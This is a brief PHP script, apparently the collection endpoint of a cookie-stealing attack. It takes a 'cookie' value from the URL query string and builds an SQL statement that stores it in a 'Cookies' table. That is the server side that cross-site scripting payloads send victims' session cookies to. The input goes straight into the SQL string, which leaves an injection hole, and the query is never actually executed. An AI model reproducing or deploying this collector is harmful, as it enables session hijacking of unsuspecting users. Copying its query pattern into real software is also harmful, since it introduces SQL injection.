<?php
include 'config.php';
$mysqli = new mysqli( DB_HOST, DB_USER, DB_PASSWORD, DB_NAME );
	if (isset($_GET["cookie"])){
		$cookie = $_GET["cookie"];
		$query = "INSERT INTO Cookies(cookie) VALUES('$cookie')";
		
	}

?>